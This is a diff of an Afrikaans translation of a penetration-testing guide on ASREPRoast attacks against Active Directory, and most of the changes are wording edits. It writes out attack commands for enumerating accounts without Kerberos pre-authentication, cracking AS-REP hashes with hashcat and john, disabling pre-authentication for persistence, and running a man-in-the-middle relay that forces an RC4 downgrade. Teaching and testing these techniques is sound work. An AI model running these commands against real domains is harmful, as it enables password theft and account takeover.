@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoast is 'n sekuriteitsaanval wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. In wese laat hierdie kwesbaarheid aanvalleerders toe om verifikasie vir 'n gebruiker by die Domain Controller (DC) te versoek sonder om die gebruiker se wagwoord te ken. Die DC antwoord dan met 'n boodskap wat versleuteld is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvalleerders offline kan probeer kraak om die gebruiker se wagwoord te ontdek.
+ASREPRoast is 'n sekuriteitsaanval wat gebruikers uitbuit wat nie die **Kerberos pre-authentication required attribute** het nie. In wese laat hierdie kwesbaarheid aanvallers toe om verifikasie vir 'n gebruiker by die Domain Controller (DC) aan te vra sonder om die gebruiker se wagwoord te benodig. Die DC reageer dan met 'n boodskap wat versleuteld is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers offline kan probeer kraak om die gebruiker se wagwoord te ontdek.
 
 Die hoofvereistes vir hierdie aanval is:
 
-- **Lack of Kerberos pre-authentication**: Teikengebruikers moet hierdie sekuriteitsfunksie nie geaktiveer hê nie.
-- **Connection to the Domain Controller (DC)**: Aanvalleerders het toegang tot die DC nodig om versoeke te stuur en versleutelde boodskappe te ontvang.
-- **Optional domain account**: Om 'n domain account te hê kan aanvalleerders meer doeltreffend kwesbare gebruikers deur LDAP queries identifiseer. Sonder so 'n account moet aanvalleerders gebruikersname raai.
+- **Lack of Kerberos pre-authentication**: Teikengebruikers mag hierdie sekuriteitsfunksie nie aangeskakel hê nie.
+- **Connection to the Domain Controller (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en versleutelde boodskappe te ontvang.
+- **Optional domain account**: Om 'n domain account te hê stel aanvallers in staat om meer doeltreffend kwesbare gebruikers te identifiseer deur LDAP queries. Sonder so 'n rekening moet aanvallers gebruikersname raai.
 
-#### Enumerering van kwesbare gebruikers (vereis domain credentials)
+#### Enumerating vulnerable users (need domain credentials)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -33,22 +33,22 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting with Rubeus sal 'n 4768 genereer met 'n versleutelingstipe van 0x17 en 'n preauth-tipe van 0.
+> AS-REP Roasting with Rubeus sal 'n 4768 genereer met 'n encryption type van 0x17 en preauth type van 0.
 
-#### Vinnige eenreëls (Linux)
+#### Kort eenreëls (Linux)
 
-- Eerstens, enumereer potensiële teikens (bv. uit leaked build paths) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- Haal 'n enkele gebruiker se AS-REP selfs met 'n **leë** wagwoord af deur `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` te gebruik (netexec toon ook LDAP signing/channel binding posture).
+- Eerstens, enumereer potensiële teikens (bv. vanaf leaked build paths) met Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Haal 'n enkele gebruiker se AS-REP selfs met 'n **blank** wagwoord deur `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` te gebruik (netexec druk ook LDAP signing/channel binding posture).
 - Kraak met `hashcat out.asreproast /path/rockyou.txt` – dit herken outomaties **-m 18200** (etype 23) vir AS-REP roast hashes.
 
-### Kraken
+### Cracking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistensie
 
-Geen **preauth** word vereis vir 'n gebruiker waarvoor jy **GenericAll**-toestemmings het (of toestemmings om eienskappe te skryf):
+Om **preauth** af te dwing is nie nodig vir 'n gebruiker waarvoor jy **GenericAll**-regte het (of regte om eienskappe te skryf):
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -56,10 +56,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
-## ASREProast sonder kredensiale
+## ASREProast without credentials
 
-Een aanvaller kan 'n man-in-the-middle-posisie gebruik om AS-REP-pakkette vas te vang terwyl hulle deur die netwerk beweeg, sonder om te staat te maak dat Kerberos pre-authentication gedeaktiveer is. Dit werk dus vir alle gebruikers op die VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) maak dit vir ons moontlik. Verder dwing die tool kliënt-werkstasies om RC4 te gebruik deur die Kerberos-onderhandeling te verander.
+’n aanvaller kan ’n man-in-the-middle-posisie gebruik om AS-REP-pakkette vas te vang terwyl hulle deur die netwerk beweeg, sonder om op Kerberos pre-authentication staat te maak. Dit werk dus vir alle gebruikers op die VLAN.\  
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) stel ons in staat om dit te doen. Boonop dwing die hulpmiddel kliënt-werkstasies om RC4 te gebruik deur die Kerberos-onderhandeling te verander.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
